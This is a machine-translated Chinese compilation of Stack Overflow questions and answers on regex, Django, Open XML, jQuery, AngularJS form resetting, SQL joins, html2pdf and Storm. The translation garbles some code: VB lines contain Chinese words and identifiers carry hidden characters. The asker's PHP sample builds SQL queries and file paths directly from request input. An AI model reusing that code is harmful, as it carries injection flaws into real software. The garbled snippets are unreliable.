* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:42:03.030

安全的方法是使用正则表达式模式`(<script\b(?![^>]*\bsrc=)[^>]*>)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:27:07.587

您很接近，但可能可以将其简化为`<script(?!.*src.*)>`.

您对行的开头或结尾并不真正感兴趣，因此无需包括这些方面。

顺便说一句，正是那一秒`^`让你失望了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:29:58.893

只需使用 `^.*(<script(?!.*src).*)$`

# django - 如何解决我在使用 South 时遇到的迁移错误？

> ID：12603903
> 
> 赞同：2
> 
> 时间：2012-09-26T14:24:15.037
> 
> 标签：django, view, model, foreign-keys, django-south

我尝试将以下模型中的字段从 CharField 更改为 ForeignKey，但在运行迁移时出现错误。我得到的错误是：

致命错误 - 以下 SQL 查询失败：CREATE INDEX "reserve_reviewbackup_fbfc09f1" ON "reserve_reviewbackup" ("user_id"); 错误是：索引reserve_reviewbackup_fbfc09f1 已经存在！在实际运行迁移过程中发现错误！中止。

！由于您有一个不支持运行的数据库！交易中的模式改变语句，我们有！使其处于迁移之间的临时状态。

```
class Reviewbackup(models.Model):
    review = models.CharField('Review', max_length = 2000)
    user = models.CharField('Username', max_length =  200)
    rating = models.IntegerField(max_length=2, choices=RATING_OPTIONS)
    product = models.ForeignKey(Productbackup)
    def __unicode__(self):
        return self.review

user = models.ForeignKey(User, related_name='reviews') 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-21T09:51:52.910

我以前做过。只需从数据库管理员手动删除索引，一切正常。

# c# - XML SDK 重新计算值

> ID：12603904
> 
> 赞同：1
> 
> 时间：2012-09-26T14:24:29.197
> 
> 标签：c#, openxml, openxml-sdk

我有一个 excel 文件，我有一段代码可以用公式更新一些单元格。

在保存文件之前，我设置了这两个布尔属性：

```
spreadSheet.WorkbookPart.Workbook.CalculationProperties.ForceFullCalculation = true;
spreadSheet.WorkbookPart.Workbook.CalculationProperties.FullCalculationOnLoad = true;
// Save the worksheet.
worksheetPart.Worksheet.Save(); 
```

保存文件后，我使用 Open XML SDK 再次打开它，但我仍然得到旧值。当我使用 Excel 打开 excel 文件并保存它时，我可以看到新值。

你知道我怎样才能让值重新计算吗？如果我保存文件，我希望如果我打开它，应该重新计算这些值。

谢谢。何塞。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T10:57:30.573

如果您有缓存值，那么将使用这些值并且不会重新计算这些值。尝试刷新缓存值，如下所示：

```
public static void FlushCachedValues(SpreadsheetDocument doc)
{
   doc.WorkbookPart.WorksheetParts
      .SelectMany(part => part.Worksheet.Elements<SheetData>())
      .SelectMany(data => data.Elements<Row>())
      .SelectMany(row => row.Elements<Cell>())
      .Where(cell => cell.CellFormula != null && cell.CellValue != null)
      .ToList()
      .ForEach(cell => cell.CellValue.Remove());
 } 
```

只需确保在保存文档之前调用此方法即可。

# javascript - 这个页面有什么效果

> ID：12603906
> 
> 赞同：-4
> 
> 时间：2012-09-26T14:24:33.177
> 
> 标签：javascript, jquery, html, css

我只是希望找出这个页面上的效果：

[http://www.spacho.com/](http://www.spacho.com/)

我想做类似的事情。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:26:33.773

它被称为视差滚动。你可以在网上找到很多教程和插件来帮助你创建类似的效果。

# jquery - 如何制作可放置的 div

> ID：12603907
> 
> 赞同：0
> 
> 时间：2012-09-26T14:24:34.443
> 
> 标签：jquery, drag-and-drop

我创建了一个没有 UI 或其他插件的可拖动 div。但是有一个大问题是我不能制作可放置的 div。这是我的代码：

```
$(function() {
    $(".dragIt").on("mousedown", function(e) {
        var $dragIt = $(this).addClass('draggable');
        var z_idx = $dragIt.css('z-index'),
            dragHeight = $dragIt.outerHeight(),
            dragWidth = $dragIt.outerWidth(),
            positionY = $dragIt.offset().top + dragHeight - e.pageY,
            positionX = $dragIt.offset().left + dragWidth - e.pageX;
        $dragIt.css('z-index', 1000).parents().on("mousemove", function(e) {
            $('.draggable').offset({
                top: e.pageY + positionY - dragHeight,
                left: e.pageX + positionX - dragWidth
            });
        });
        e.preventDefault();
    }).on("mouseup", function(e) {
        $(this).removeClass('draggable');
    });
});​ 
```

我尝试了一些方法，例如：

```
if ( $('.dragIn').position() < $('.dropIn').position() ) {console.log('dropped');} 
```

但它不起作用。有什么解决办法吗？感谢您的提前！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T17:37:51.170

通常，除非它更有效，否则我不会重新创建功能。我建议使用 UI 插件，但这应该会让你走上正确的道路。

见[http://jsfiddle.net/sgy9u/7/](http://jsfiddle.net/sgy9u/7/)

HTML：

```
<div class="dragIt">Draggable</div>
<div class="dropIt">Drop Here</div> 
```

查询：

```
$(function() {
$(".dragIt").on("mousedown", function(e) {
    var $dragIt = $(this).addClass('draggable');
    var z_idx = $dragIt.css('z-index'),
        dragHeight = $dragIt.outerHeight(),
        dragWidth = $dragIt.outerWidth(),
        positionY = $dragIt.offset().top + dragHeight - e.pageY,
        positionX = $dragIt.offset().left + dragWidth - e.pageX;
    $dragIt.css('z-index', 1000).parents().on("mousemove", function(e) {
        $('.draggable').offset({
            top: e.pageY + positionY - dragHeight,
            left: e.pageX + positionX - dragWidth
        });
    });
    e.preventDefault();
}).on("mouseup", function(e) {
//changes to your code start here
    var dragOff=$('.draggable').offset();
    var off=$('.dropIt').offset();
    var height=$('.dropIt').height();
    var width=$('.dropIt').width();

    //checking the boundaries of dropIt and recording 'dropped' to the console
    if(dragOff.left>=off.left && dragOff.left<=off.left+width
       && dragOff.top>=off.top && dragOff.top <=off.top+height)
        console.log('dropped'); 
//changes to your code end here
    $(this).removeClass('draggable');
}); 
```

# ajax - 使用浏览器或操作系统阻止特定的 AJAX 请求

> ID：12603909
> 
> 赞同：2
> 
> 时间：2012-09-26T14:24:40.027
> 
> 标签：ajax, testing

我正在尝试测试产品以确保它正确失败，因此希望能够阻止特定的 AJAX 请求返回任何数据。我可以修改源以使请求失败，但我必须证明它可以在不更改代码的情况下工作。

我怎样才能阻止特定的 url 返回数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T12:27:36.133

这可能会有所帮助-它是一个火狐插件-尚未尝试过，但看起来不错-它说它允许您编辑和更改请求[-addons.mozilla.org/en-US/firefox/addon/tamper-data](http://addons.mozilla.org/en-US/firefox/addon/tamper-data)

# c# - C# 到 VB 的转换

> ID：12603912
> 
> 赞同：-1
> 
> 时间：2012-09-26T14:24:46.030
> 
> 标签：c#, vb.net, listbox, c#-to-vb.net

检查以下链接..

[http://www.codeproject.com/Tips/197335/Synchronized-ListBox-objects-or-how-to-scroll-2-Li](http://www.codeproject.com/Tips/197335/Synchronized-ListBox-objects-or-how-to-scroll-2-Li)

它是同步两个列表框的代码.. 代码在 C# 中.. 将大部分内容转换为 VB，但我不明白如何转换以下行..

1 - 私有常量 int SIF_ALL = SIF_RANGE | SIF_PAGE | SIF_POS | SIF_TRACKPOS；

2 - 如果（OnHorizo​​ntalScroll ！= null）

3 - 如果（OnVerticalScroll ！= null）

PS：在第二和第三个语句中，OnHorizo​​ntalScroll 和 OnVerticalScroll 是我创建的事件！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:32:54.123

您始终可以使用代码转换器工具在 C# 和 VB.Net 之间转换代码行

[http://www.developerfusion.com/tools/convert/csharp-to-vb/](http://www.developerfusion.com/tools/convert/csharp-to-vb/)

只需复制并粘贴您想要的代码，它通常效果很好。

这是我得到的输出：

1) Private Const SIF_ALL As Integer = SIF_RANGE 或 SIF_PAGE 或 SIF_POS 或 SIF_TRACKPOS

2) 如果 OnHorizo​​ntalScroll IsNot Nothing 在 VB 中您实际上并不需要这一行。不管下一行是什么，只要写这个... RaiseEvent OnHorizo​​ntalScroll( ... )

3) 如果 OnVerticalScroll IsNot Nothing 在 VB 中您实际上并不需要这一行。不管下一行是什么，只要写这个... RaiseEvent OnHorizo​​ntalScroll( ... )

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:31:46.513

这是代码在 VB 中的外观

```
Private Const SIF_ALL As Integer = SIF_RANGE Or SIF_PAGE Or SIF_POS Or SIF_TRACKPOS
If OnHorizontalScroll IsNot Nothing
If OnVerticalScroll IsNot Nothing 
```

Telerik 的在线转换器 [http://converter.telerik.com/](http://converter.telerik.com/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:32:28.503

不明白为什么要将任何东西从 C# 转换为 VB，但它就在这里；

**1.** `private const int SIF_ALL = SIF_RANGE Or SIF_PAGE Or SIF_POS Or SIF_TRACKPOS;`

**2.** `if (OnHorizontalScroll IsNot Nothing)`

**3.** `if (OnVerticalScroll IsNot Nothing)`

有关参考，请参阅[VB.NET 和 C# 比较](http://www.harding.edu/fmccown/vbnet_csharp_comparison.html)。

# angularjs - 将表单重置为原始状态（AngularJS 1.0.x）

> ID：12603914
> 
> 赞同：64
> 
> 时间：2012-09-26T14:24:47.050
> 
> 标签：angularjs

将表单字段重置为原始状态（重置脏状态）的功能在 AngularJS 1.1.x 的路线图上。不幸的是，当前稳定版本中缺少这样的功能。

**将所有表单字段重置为 AngularJS 1.0.x 的初始原始状态的最佳方法是什么？**

我想知道这是否可以通过指令或其他简单的解决方法来解决。我更喜欢无需接触原始 AngularJS 源代码的解决方案。为了澄清和演示这个问题，一个指向 JSFiddle 的链接。[http://jsfiddle.net/juurlink/FWGxG/7/](http://jsfiddle.net/juurlink/FWGxG/7/)

所需功能在**路线图**上- [http://blog.angularjs.org/2012/07/angularjs-10-12-roadmap.html](http://blog.angularjs.org/2012/07/angularjs-10-12-roadmap.html)
**功能请求**- [https://github.com/angular/angular.js/issues/856](https://github.com/angular/angular.js/issues/856)
提出的解决方案**拉取请求**- [https://github.com/angular/angular.js/pull/1127](https://github.com/angular/angular.js/pull/1127)

## 更新了可能的解决方法

**足够好的解决方法？**

我刚刚发现我可以重新编译 HTML 部分并将其放回 DOM。它可以工作并且对于临时解决方案很好，但也正如评论中提到的@blesh：

*控制器应该只用于业务逻辑，而不是 DOM！*

```
<div id="myform">
  <form class="form-horizontal" name="form">
  </form>
</div> 
```

在我的控制器上`resetForm()`：

*   保存原始未修改的 HTML
*   重新编译保存的原始 HTML
*   从 DOM 中删除当前表单
*   将新编译的模板插入 DOM

JavaScript：

```
var pristineFormTemplate = $('#myform').html();
$scope.resetForm = function () {
    $('#myform').empty().append($compile(pristineFormTemplate)($scope));
} 
```

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2013-09-23T16:10:24.453

我认为值得一提的是，在更高版本的 Angular（例如 1.1.5）中，您可以调用`$setPristine`表单。

```
$scope.formName.$setPristine(true) 
```

这也会将所有表单控件设置为原始状态。

[FormController.$setPristine](http://docs.angularjs.org/api/ng.directive:form.FormController#$setPristine)

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2013-04-30T09:50:36.473

# 没有解决方法的解决方案

我想出了一个解决方案，它使用 AngularJS 而没有任何解决方法。这里的技巧是使用 AngularJS 的能力来拥有多个具有相同名称的指令。

正如其他人提到的那样，实际上有一个拉取请求（[https://github.com/angular/angular.js/pull/1127](https://github.com/angular/angular.js/pull/1127)），它进入了允许重置表单的 AngularJS 1.1.x 分支。对此拉取请求的提交会更改 ngModel 和 form/ngForm 指令（我本来想添加一个链接，但 Stackoverflow 不希望我添加两个以上的链接）。

我们现在可以定义自己的 ngModel 和 form/ngForm 指令，并使用拉取请求中提供的功能扩展它们。

我已经将这些指令包装在一个名为 resettableForm 的 AngularJS 模块中。您所要做的就是将此模块包含到您的项目中，并且您的 AngularJS 版本 1.0.x 在这方面表现得就好像它是 Angular 1.1.x 版本一样。

''一旦你更新到 1.1.x，你甚至不必更新你的代码，只需删除模块，你就完成了！''

该模块还通过了为表单重置功能添加到 1.1.x 分支的所有测试。

您可以在我创建的 jsFiddle ( [http://jsfiddle.net/jupiter/7jwZR/1/](http://jsfiddle.net/jupiter/7jwZR/1/) )的示例中看到该模块的工作情况。

## 第 1 步：在项目中包含 resettableform 模块

```
(function(angular) {

// Copied from AngluarJS
function indexOf(array, obj) {
  if (array.indexOf) return array.indexOf(obj);

  for ( var i = 0; i < array.length; i++) {
    if (obj === array[i]) return i;
  }
  return -1;
}

// Copied from AngularJS
function arrayRemove(array, value) {
  var index = indexOf(array, value);
  if (index >=0)
    array.splice(index, 1);
  return value;
}

// Copied from AngularJS
var PRISTINE_CLASS = 'ng-pristine';
var DIRTY_CLASS = 'ng-dirty';

var formDirectiveFactory = function(isNgForm) {
    return function() {
        var formDirective = {
            restrict: 'E',
            require: ['form'],
            compile: function() {
                return {
                    pre: function(scope, element, attrs, ctrls) {
                        var form = ctrls[0];
                        var $addControl = form.$addControl;
                        var $removeControl = form.$removeControl;
                        var controls = [];
                        form.$addControl = function(control) {
                            controls.push(control);
                            $addControl.apply(this, arguments);
                        }
                        form.$removeControl = function(control) {
                            arrayRemove(controls, control);
                            $removeControl.apply(this, arguments);
                        }
                        form.$setPristine = function() {
                            element.removeClass(DIRTY_CLASS).addClass(PRISTINE_CLASS);
                            form.$dirty = false;
                            form.$pristine = true;
                            angular.forEach(controls, function(control) {
                                control.$setPristine();
                            });
                        }
                    },
                };
            },
        };
        return isNgForm ? angular.extend(angular.copy(formDirective), {restrict: 'EAC'}) : formDirective;
    };
}
var ngFormDirective = formDirectiveFactory(true);
var formDirective = formDirectiveFactory();
angular.module('resettableForm', []).
    directive('ngForm', ngFormDirective).
    directive('form', formDirective).
    directive('ngModel', function() {
        return {
            require: ['ngModel'],
            link: function(scope, element, attrs, ctrls) {
                var control = ctrls[0];
                control.$setPristine = function() {
                    this.$dirty = false;
                    this.$pristine = true;
                    element.removeClass(DIRTY_CLASS).addClass(PRISTINE_CLASS);
                }
            },
        };
    });
})(angular); 
```

## 第 2 步：在控制器上提供一个重置模型的方法

请注意，重置表单时必须重置模型。在您的控制器中，您可以编写：

```
var myApp = angular.module('myApp', ['resettableForm']);

function MyCtrl($scope) {
    $scope.reset = function() {
        $scope.form.$setPristine();
        $scope.model = '';
    };
} 
```

## 第 3 步：在您的 HTML 模板中包含此方法

```
<div ng-app="myApp">
<div ng-controller="MyCtrl">
<form name="form">
    <input name="requiredField" ng-model="model.requiredField" required/> (Required, but no other validators)
    <p ng-show="form.requiredField.$errror.required">Field is required</p>
    <button ng-click="reset()">Reset form</button>
</form>
<p>Pristine: {{form.$pristine}}</p>
</div>
</dvi> 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-09-26T21:34:05.530

编辑...我正在删除我的旧答案，因为它还不够。

实际上，我自己只是遇到了这个问题，这是我的解决方案：我为 angular 做了一个扩展方法。我通过遵循 $scope.form.$setValidity() 正在做的一些事情来做到这一点（相反）......

**[这是它的 plnkr 演示](http://plnkr.co/edit/j0COYl)**

这是我制作的辅助方法。这是一个黑客，但它有效：

```
angular.resetForm = function (scope, formName, defaults) {
    $('form[name=' + formName + '], form[name=' + formName + '] .ng-dirty').removeClass('ng-dirty').addClass('ng-pristine');
    var form = scope[formName];
    form.$dirty = false;
    form.$pristine = true;
    for(var field in form) {
      if(form[field].$pristine === false) {
        form[field].$pristine = true;
      }
      if(form[field].$dirty === true) {
        form[field].$dirty = false;
      }
    }
    for(var d in defaults) {
      scope[d] = defaults[d];
    }
}; 
```

希望这对某人有帮助。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-09-26T19:22:02.520

您的表单字段应链接到 $scope 中的变量。您可以通过重置变量来重置表单。它可能应该是像 $scope.form 这样的单个对象。

假设您有一个简单的用户表单。

```
app.controller('Ctrl', function Ctrl($scope){
  var defaultForm = {
    first_name : "",
    last_name : "",
    address: "",
    email: ""
  };
  $scope.resetForm = function(){
    $scope.form = defaultForm;
  };
}); 
```

只要您的 html 看起来像这样，这将非常有用：

```
<form>
  <input ng-model="form.first_name"/>
  <input ng-model="form.last_name"/>
  <input ng-model="form.address"/>
  <input ng-model="form.email"/>
  <button ng-click="resetForm()">Reset Form</button>
</form> 
```

也许我不理解这里的问题，所以如果这不能解决你的问题，你能解释一下为什么吗？

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-01-11T11:28:10.603

在这里，我找到了将 from 置于原始状态的解决方案。

```
var def = {
    name: '',
    password: '',
    email: '',
    mobile: ''
};

$scope.submited = false;

$scope.regd = function (user) {
    if ($scope.user.$valid) {
        $http.post('saveUser', user).success(function (d) {
            angular.extend($scope.user, def);
            $scope.user.$setPristine(true);
            $scope.user.submited = false;
        }).error(function (e) {});
    } else {
        $scope.user.submited = true;
    }
}; 
```

只需编写**[angular.extends(src,dst)](http://docs.angularjs.org/api/angular.extend)**，以便您的原始对象只是扩展空白对象，它将显示为空白，其余均为默认值。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-03-31T19:48:04.780

使用外部指令和大量 jquery

```
app.controller('a', function($scope) {
    $scope.caca = function() {
        $scope.$emit('resetForm');
    }
});

app.directive('form', function() {
    return {
        restrict: 'E',
        link: function(scope, iElem) {
            scope.$on('resetForm', function() {
                iElem.find('[ng-model]').andSelf().add('[ng-form]').each(function(i, elem) {
                    var target = $(elem).addClass('ng-pristine').removeClass('ng-dirty');
                    var control = target.controller('ngModel') || target.controller('form');
                    control.$pristine = true;
                    control.$dirty = false;
                });
            });
        }
    };
}); 
```

[http://jsfiddle.net/pPbzz/2/](http://jsfiddle.net/pPbzz/2/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-05-14T16:12:55.200

最简单的方法：只需将表单传递给控制器​​函数。下面的表单“myForm”被**this**引用，相当于 $scope。

```
<div ng-controller="MyController as mc">
    <ng-form name="myform">
        <input ng-model="mc.myFormValues.name" type="text" required>
        <button ng-click="mc.doSometing(this.myform)" type="submit" 
                ng-disabled="myform.$invalid||myform.$pristine">Do It!</button>
    </ng-form>
</div> 
```

控制器：

```
function MyController(MyService) {
    var self = this;
    self.myFormValues = {
        name: 'Chris'
    };
    self.doSomething = function (form) {
        var aform = form;
        MyService.saveSomething(self.myFromValues)
            .then(function (result) {
                ...
                aform.$setPristine();
            }).catch(function (e) {
                ...
            aform.$setDirty();
        })
    }
} 
```

# sql - SQL join 2个表基于第三个

> ID：12603915
> 
> 赞同：0
> 
> 时间：2012-09-26T14:24:51.990
> 
> 标签：sql, join

我有 3 张桌子：

```
tbl_question (id,question)
tbl_answer (id,answer)
question_has_answer (id,question_id,answer_id) 
```

看起来像多对多关联，但实际上它只是像一对多那样使用（一个问题有多个答案，但每个答案只属于一个问题）。所以我需要从第一个和第二个表中获取字段（id除外），如下所示：

```
Question1
      answer1
      answer2
      answer3
Question2
      answer5
      answer4 
```

等等。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:33:05.343

将会：

```
SELECT question, answer
    FROM tbl_question q 
    INNER JOIN question_has_answer qha
    ON q.id = qha.question_id
    INNER JOIN tbl_answer a
    ON qha.answer_id = a.id
ORDER BY question,answer 
```

如果您不打算使用该 ID，我还建议不要对 table question_has_answer 使用 ID。

更进一步：如果 1 个答案仅与 1 个问题相关联，则不应使用 question_has_answer 并修改 tbl_answer 以添加 questionID 列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:37:58.257

以此处提供的其他答案为基础。这两个表应该是一个表，例如`question_has_answer`with ( , , )。不需要两张表，您已经可以判断一个问题是否得到回答。如果一个问题在表格中没有给出答案，那么它就不会被回答。但是现在您可以使用其他答案指出的三个表格。`tbl_answer``tbl_answers``id``question_id``answer_id``question_has_answer``JOIN`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:29:34.057

试试这个。

```
SELECT  b.question, c.answer
FROM    question_has_answer a
        INNER JOIN tbl_question b
            ON a.question_ID = b.ID
        INNER JOIN tbl_answer c
            ON a.answer_ID = c.id
ORDER BY a.question_ID, a.answer_ID 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T14:32:35.323

```
select question, answer
from tbl_question q
join question_has_answer qa on qa.question_id = q.id
join tbl_answer a on a.id = qa.answer_id
order by 1,2 
```

顺便说一句，“每个答案只属于一个问题”是无关紧要的；表格结构允许将答案用于多个问题。他们不是的事实仅仅是现存数据的问题。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2019-03-16T06:52:13.907

```
SELECT obj.*,mapping.*,mas.* FROM object_master obj
INNER JOIN mapping_master mapping ON mapping.FMM_Object_ID = obj.FOM_ID
INNER JOIN feedback_master mas ON mapping.FMM_FM_ID = mas.FM_ID 
```

# php - 转换为 pdf 时出现 html2pdf 错误

> ID：12603919
> 
> 赞同：2
> 
> 时间：2012-09-26T14:25:02.677
> 
> 标签：php, pdf, font-face, html2pdf

我有以下代码：

```
<?php session_start();
ob_start(); 
// on vérifie toujours qu'il s'agit d'un membre qui est connecté
if (!isset($_SESSION['login'])) { 
   // si ce n'est pas le cas, on le redirige vers l'accueil
   header ('Location: ../index.php'); 
   exit();  
}  
require_once('Connections/localhost.php'); 
mysql_select_db( $database_localhost ); ?>
 <page backtop="50mm"  backbottom="30mm" > 
    <page_header> <font face="arial">
<?php $sql="SELECT `entete`, `pieddepage` FROM `entete` INNER JOIN `courrier` ON `entete`.`id` = `courrier`.`code_entete` WHERE `courrier`.`code_lettre`='".mysql_real_escape_string($_POST['courrier'])."'" ;
 $msg= $_POST['msg'];
$result= mysql_query($sql);
$donnees=mysql_fetch_assoc($result) ;
echo $donnees['entete'] ;  ?>       </font>       
    </page_header> 
    <page_footer> <font face="arial">
<?php echo $donnees['pieddepage'] ;  ?>     
</font>   
    </page_footer> 
    <font face="arial">
    <?php echo '<font face="Arial">'.$_POST['editor1'].'</font>' ; ?></font>
 </page> 
<?php $content=ob_get_contents();
    ob_end_clean();
   require_once('html2pdf.class.php');
   $html2pdf = new HTML2PDF('P','A4','fr');
   $html2pdf->WriteHTML($content);
$path= 'courriers';
if(file_exists($path)) 
{ 
mkdir($path.'/'.$_GET['n_doss']); 
}
else
{
mkdir($path);
mkdir($path.'/'.$_GET['n_doss']); 
}
  $html2pdf->Output($path.'/'.$_GET['n_doss'].'/'.$_POST['nom_courrier'].'-'.date('d-m-Y').'.pdf', 'F');
  $url=$path.'/'.$_GET['n_doss'].'/'.$_POST['nom_courrier'].'-'.date('d-m-Y').'.pdf';
$sql="INSERT INTO `courrier-envoye` SET
qui = '".$_SESSION['login']."',
quoi = '".$_POST['nom_courrier']."',
quand = '".date('Y-m-d')."',
n_doss= '".$_GET['n_doss']."',
url= '".$url."'";
$req=mysql_query($sql) or die(__LINE__.mysql_error().$sql); 

 header('Location: '.$url);

?> 
```

事实上，它对我说：

TCPDF 错误：无法包含字体定义文件：verdana

但问题是我从来没有在我的代码中放置类似的东西`<font face='verdana'>`

所以我真的不知道这个麻烦是从哪里来的。

接受我最崇高的敬意。

亲切的问候。

SP

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-26T11:10:45.103

1.将任何verdana.ttf字体文件转换为[http://www.fpdf.org/makefont/中的cp-1252编码](http://www.fpdf.org/makefont/)

2.将编码后的文件放到html2pdf或tcpdf或fpdf代码中的fonts目录下进行pdf转换

1.  `$html2pdf = new HTML2PDF('P', 'A4', 'fr');`

$root_directory="/你的根目录到pdf转换包如tcpdf,html2pdf,fpdf/";

```
$html2pdf->addFont('verdana', '', ''.$root_directory.'/fonts/source-sans-pro.light.php');

//use your font-family:verdana into the html tag in $content 

$content="<b style='font-family:verdana'>hello</b>";

$html2pdf->writeHTML($content);

$html2pdf->Output(); 
```

检查你的pdf文件

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T14:35:16.797

看看这个。可能有帮助。

[为 HTML2PDF 制作字体](http://wiki.spipu.net/doku.php?id=html2pdf%3aen%3av3%3afont)

# apache-storm - (Twitter) Storm 的聚合窗口

> ID：12603920
> 
> 赞同：7
> 
> 时间：2012-09-26T14:25:04.893
> 
> 标签：apache-storm, real-time-data, real-time-systems

我在玩 Storm，我想知道 Storm 在哪里指定（如果可能的话）聚合时的（翻滚/滑动）窗口大小。例如，如果我们想在 Twitter 上查找前一小时的热门话题。我们如何指定一个螺栓应该每小时返回一次结果？这是在每个螺栓内以编程方式完成的吗？还是以某种方式指定“窗口”？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-06T18:38:28.930

免责声明：我写了[gakhov 在上面的回答](https://stackoverflow.com/a/14734092/1743580)中引用的 Storming Topics 文章。

[我想说最好的做法是在 Storm 0.8+](http://www.michael-noll.com/blog/2013/01/18/implementing-real-time-trending-topics-in-storm/#excursus-tick-tuples-in-storm-08)中使用所谓的刻度元组。有了这些，您可以配置自己的 spouts/bolts 以在特定时间间隔（例如，每十秒或每分钟）收到通知。

这是一个简单的示例，它将相关组件配置为每十秒接收一次刻度元组：

```
// in your spout/bolt
@Override
public Map<String, Object> getComponentConfiguration() {
    Config conf = new Config();
    int tickFrequencyInSeconds = 10;
    conf.put(Config.TOPOLOGY_TICK_TUPLE_FREQ_SECS, tickFrequencyInSeconds);
    return conf;
} 
```

然后，您可以在 spout/bolt 的`execute()`方法中使用条件开关来区分“正常”传入元组和特殊刻度元组。例如：

```
// in your spout/bolt
@Override
public void execute(Tuple tuple) {
    if (isTickTuple(tuple)) {
        // now you can trigger e.g. a periodic activity
    }
    else {
        // do something with the normal tuple
    }
}

private static boolean isTickTuple(Tuple tuple) {
    return tuple.getSourceComponent().equals(Constants.SYSTEM_COMPONENT_ID)
        && tuple.getSourceStreamId().equals(Constants.SYSTEM_TICK_STREAM_ID);
} 
```

同样，正如 gakhov 指出的那样，我几天前在 Storm 中写了一篇非常[详细的博客文章（无耻的插件！）。](http://www.michael-noll.com/blog/2013/01/18/implementing-real-time-trending-topics-in-storm/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-02T23:43:03.897

Add a new spout with parallelism degree of 1, and have it emit an empty signal and then Utils.sleep until next time (all done in nextTuple). Then, link all relevant bolts to that spout using all-grouping, so all of their instances will receive that same signal.

# android - 使用 ViewFlipper 调用 setVisibility 时的 NPE

> ID：12603925
> 
> 赞同：0
> 
> 时间：2012-09-26T14:25:22.493
> 
> 标签：android, nullpointerexception, android-fragments

我有一个带有以下 XML 的 ViewFlipper 请注意，这都包含在 RelativeLayout

```
<ViewFlipper
    android:id="@+id/flipperIdentView"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <include layout="@layout/identification_face"/>
    <include layout="@layout/identification_rfid"/>
    <include layout="@layout/identification_voice"/>
    <include layout="@layout/identification_pill_dispense"/>

</ViewFlipper>

<LinearLayout
    android:id="@+id/linear_button_view"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="bottom"
    android:orientation="vertical" >

 <include
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"
     layout="@layout/test_buttons"
     android:gravity="center" />

</LinearLayout> 
```

LinearLayout 的 ID 为“linear_button_view”。现在在我的片段中，我有代码来确定翻转，并且一切正常。问题是，当我到达脚蹼的索引 3 时，我想隐藏这个布局。我所要做的就是用这个 ID 创建一个字段，然后将 Visibility 设置为 View.Gone。但是当我尝试这样做时，我正在抛出一个 NPE。

在课堂上我有一个：

```
private View buttonView; 
```

在我的 onCreateView 中，我有以下代码

```
View v = inflater.inflate(R.layout.pilltransferflipper, container, false);
buttonView = v.findViewById(R.id.linear_button_view); 
```

这是我控制鳍状肢的方法，负责隐藏视图。

```
private void nextState() {

flipperIndex++;
if (flipperIndex >= flipperPillTransfer.getChildCount()) {
    MainActivity activity = (MainActivity) getActivity();
    activity.stateChange(State.SESSIONFINISHED);
} else {
    flipperPillTransfer.showNext();
        Log.d(TAG, "FLIPPER INDEX: " + flipperIndex);
    if(flipperIndex == 3) {

        buttonView.setVisibility(View.GONE);

        }

    }

} 
```

当我在 FlipperIndex 条件中放置一条 Log.d 消息时，它返回正常，似乎问题出在 buttonView.setVisibility 部分。请记住，我正在使用片段，因此主活动中可用的某些方法可能对我不可用。谢谢！

# 这是logCat

```
09-26 10:05:54.381: D/PillTransferFragment(1719): FLIPPER INDEX: 3
09-26 10:05:54.381: D/AndroidRuntime(1719): Shutting down VM
09-26 10:05:54.381: W/dalvikvm(1719): threadid=1: thread exiting with uncaught exception (group=0x40c2b300)
09-26 10:05:54.381: E/AndroidRuntime(1719): FATAL EXCEPTION: main
09-26 10:05:54.381: E/AndroidRuntime(1719): java.lang.NullPointerException
09-26 10:05:54.381: E/AndroidRuntime(1719): at com.example.android.fragments.PillTransferFragment.nextState(PillTransferFragment.java:107)
09-26 10:05:54.381: E/AndroidRuntime(1719): at com.example.android.fragments.PillTransferFragment.onClick(PillTransferFragment.java:64)
09-26 10:05:54.381: E/AndroidRuntime(1719): at android.view.View.performClick(View.java:4084) 
```

# sql - 跨 3 个表加入

> ID：12603926
> 
> 赞同：0
> 
> 时间：2012-09-26T14:25:30.457
> 
> 标签：sql, select, join

我正在尝试将 3 个表连接在一起，并可能从任何列中检索数据。

我有一个产品和一种生活方式以及一个“映射表”，它基本上包含两者之间的引用。

我想使用连接正确地做到这一点 - 但事实证明它很麻烦。如果我使用“WHEREs”，它会起作用。

这里是

这返回的结果比我预期的要多——它可能是在做正确的事情，只是不是我想要的！

```
SELECT DISTINCT PROFDESC.* 
FROM PROFDESC 
INNER JOIN PRODUCT ON PRODFUND.PRODCD = PRODUCT.PRODCD 
INNER JOIN PRODFUND ON PRODFUND.PDFDCODE = PROFDESC.PROFREF 
WHERE PRODFUND.PDFDTYPE = 2 
```

这工作正常，但不会“加入”表格。

```
SELECT DISTINCT PROFDESC.* 
FROM PROFDESC, Product, Prodfund 
WHERE 
PRODFUND.PRODCD = PRODUCT.PRODCD and  
